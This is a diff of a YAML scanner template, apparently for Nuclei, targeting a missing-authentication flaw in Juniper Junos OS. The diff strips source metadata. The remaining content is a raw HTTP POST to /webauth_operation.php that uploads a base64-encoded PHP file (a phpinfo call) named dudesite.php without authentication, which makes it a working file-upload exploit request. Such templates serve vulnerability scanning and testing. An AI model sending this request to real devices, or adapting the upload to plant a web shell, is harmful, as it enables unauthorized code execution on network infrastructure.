@@ -3,12 +3,8 @@ info:
   name: Juniper Networks Junos OS 关键功能缺失身份验证漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hh1mn9fp0d5al3ph'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hh1mn9fp0d5al3ph
-    fofa: 暂无
 http:
 - raw:
   - 'POST /webauth_operation.php HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     rs=do_upload&rsargs%5B0%5D=%5B%7B%22fileData%22%3A%22data%3Atext%2Fhtml%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B%22%2C%22fileName%22%3A%22dudesite.php%22%2C%22csize%22%3A18%7D%5D
